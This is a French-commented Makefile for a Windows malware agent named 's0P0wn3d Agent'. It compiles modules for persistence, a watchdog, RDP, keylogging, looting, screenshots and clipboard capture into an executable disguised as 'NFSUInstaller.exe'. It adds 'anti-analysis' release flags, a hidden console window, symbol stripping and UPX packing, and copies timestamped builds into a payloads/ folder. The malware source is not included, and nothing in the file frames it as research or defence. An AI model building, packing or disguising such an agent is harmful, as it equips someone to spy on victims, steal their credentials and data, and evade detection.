# Makefile pour s0P0wn3d Agent
# Compile l'agent avec persistence et watchdog

# ============================================================================
# CONFIGURATION
# ============================================================================

# Compilateur
# Utiliser le cross-compilateur MinGW depuis WSL/Linux
CC = x86_64-w64-mingw32-gcc
WINDRES = x86_64-w64-mingw32-windres

# Fichiers source
SOURCES = agent.c persistence.c watchdog.c rdp.c keylog.c loot.c screenshot.c clipboard.c
HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h screenshot.h clipboard.h
OBJECTS = $(SOURCES:.c=.o)

# Nom de l'exécutable
TARGET = NFSUInstaller.exe

# Flags de compilation
CFLAGS_BASE = -O2 -Wall -Wextra
# Flags anti-analyse pour release
CFLAGS_RELEASE = -mwindows -s -ffunction-sections -fdata-sections
CFLAGS_DEBUG = -g -DDEBUG
CFLAGS = $(CFLAGS_BASE)

# Flags de link
LDFLAGS = -lwininet -lws2_32 -lshlwapi -lole32 -luuid -lshell32 -lgdi32 -Wl,--gc-sections

# ============================================================================
# RÈGLES PRINCIPALES
# ============================================================================

# Règle par défaut : build release
all: release

# Build version release (sans debug, fenêtre cachée)
release: CFLAGS = $(CFLAGS_BASE) $(CFLAGS_RELEASE)
release: clean $(TARGET)
	@echo ""
	@echo "=========================================="
	@echo "  Release Build Complete"
	@echo "=========================================="
	@echo "  Output: $(TARGET)"
	@echo "  Size:   $$(du -h $(TARGET) | cut -f1)"
	@echo "=========================================="
	@echo ""

# Build version debug (avec fenêtre console pour voir les prints)
debug: CFLAGS = $(CFLAGS_BASE) $(CFLAGS_DEBUG)
debug: clean $(TARGET)
	@echo ""
	@echo "=========================================="
	@echo "  Debug Build Complete"
	@echo "=========================================="
	@echo "  Output: $(TARGET)"
	@echo "  Size:   $$(du -h $(TARGET) | cut -f1)"
	@echo "  Note:   Console window will be visible"
	@echo "=========================================="
	@echo ""

# ============================================================================
# RÈGLES DE COMPILATION
# ============================================================================

# Compilation de l'agent
$(TARGET): $(OBJECTS)
	@echo "[*] Linking $(TARGET)..."
	@$(CC) $(CFLAGS) -o $(TARGET) $(OBJECTS) $(LDFLAGS)
	@echo "[+] Build complete: $(TARGET)"

# Règle pour les fichiers objets
%.o: %.c $(HEADERS)
	@echo "[*] Compiling $<..."
	@$(CC) $(CFLAGS) -c $< -o $@

# ============================================================================
# RÈGLES UTILITAIRES
# ============================================================================

# Version stripped (sans symboles de debug)
stripped: $(TARGET)
	@echo "[*] Stripping debug symbols..."
	@strip -s $(TARGET)
	@echo "[+] Stripped version created"
	@echo "  New size: $$(du -h $(TARGET) | cut -f1)"

# Version compressée avec UPX (si disponible)
compressed: stripped
	@echo "[*] Compressing with UPX..."
	@upx --best --lzma $(TARGET) 2>/dev/null && echo "[+] Compressed with UPX" || echo "[-] UPX not found, skipping"

# Test de compilation (compile mais ne link pas)
test-compile: $(OBJECTS)
	@echo "[+] All source files compile successfully"

# Nettoyage
clean:
	@echo "[*] Cleaning build files..."
	@rm -f $(OBJECTS) $(TARGET)
	@echo "[+] Clean complete"

# Rebuild complet
rebuild: clean all

# Installation dans le dossier payloads avec timestamp
install: release
	@echo "[*] Installing to payloads/..."
	@mkdir -p payloads
	@cp $(TARGET) payloads/agent_$$(date +%Y%m%d_%H%M%S).exe
	@echo "[+] Installed to payloads/"
	@ls -lh payloads/ | tail -1

# ============================================================================
# RÈGLES D'INFORMATION
# ============================================================================

# Afficher les informations de compilation
info:
	@echo ""
	@echo "s0P0wn3d Agent - Build System"
	@echo "=============================="
	@echo ""
	@echo "Compiler:    $(CC)"
	@echo "Sources:     $(SOURCES)"
	@echo "Headers:     $(HEADERS)"
	@echo "Target:      $(TARGET)"
	@echo ""
	@echo "CFLAGS:      $(CFLAGS)"
	@echo "LDFLAGS:     $(LDFLAGS)"
	@echo ""

# Vérifier les dépendances
check-deps:
	@echo "[*] Checking dependencies..."
	@command -v $(CC) >/dev/null 2>&1 && echo "  [✓] GCC found" || echo "  [✗] GCC not found"
	@command -v strip >/dev/null 2>&1 && echo "  [✓] strip found" || echo "  [✗] strip not found"
	@command -v upx >/dev/null 2>&1 && echo "  [✓] UPX found" || echo "  [✗] UPX not found (optional)"
	@echo ""

# Aide
help:
	@echo ""
	@echo "s0P0wn3d Agent - Makefile"
	@echo "========================="
	@echo ""
	@echo "Available targets:"
	@echo "  all (default) - Build release version"
	@echo "  release       - Build release (no console, stripped)"
	@echo "  debug         - Build debug (with console, symbols)"
	@echo "  test-compile  - Test compilation without linking"
	@echo "  stripped      - Build and strip symbols"
	@echo "  compressed    - Build, strip, and compress with UPX"
	@echo "  clean         - Remove build files"
	@echo "  rebuild       - Clean and rebuild"
	@echo "  install       - Build and copy to payloads/"
	@echo "  info          - Show build configuration"
	@echo "  check-deps    - Check for required dependencies"
	@echo "  help          - Show this help"
	@echo ""
	@echo "Usage examples:"
	@echo "  make              # Build release version"
	@echo "  make debug        # Build with debug symbols and console"
	@echo "  make test-compile # Test if everything compiles"
	@echo "  make install      # Build and install to payloads/"
	@echo "  make clean        # Clean build files"
	@echo ""
	@echo "Build variants:"
	@echo "  Release: Optimized, no console, stripped symbols"
	@echo "  Debug:   Debug symbols, console window for printf()"
	@echo ""

.PHONY: all release debug stripped compressed clean rebuild install test-compile info check-deps help